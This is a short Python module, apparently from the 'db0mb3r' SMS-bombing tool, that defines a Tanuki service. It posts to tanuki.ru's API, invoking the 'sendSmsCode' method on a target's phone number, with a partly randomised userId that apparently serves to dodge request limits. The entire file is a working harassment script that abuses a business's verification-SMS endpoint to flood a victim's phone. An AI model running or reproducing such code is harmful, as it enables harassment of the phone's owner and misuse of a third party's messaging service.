from random import randint

from db0mb3r.services.service import Service


class Tanuki(Service):
    async def run(self):
        await self.post(
            "https://www.tanuki.ru/api/",
            json={
                "header": {
                    "version": "2.0",
                    "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",
                    "agent": {"device": "desktop", "version": "undefined undefined"},
                    "langId": "1",
                    "cityId": "9",
                },
                "method": {"name": "sendSmsCode"},
                "data": {"phone": f"(+{self.country_code}){self.phone}", "type": 1},
            },
        )
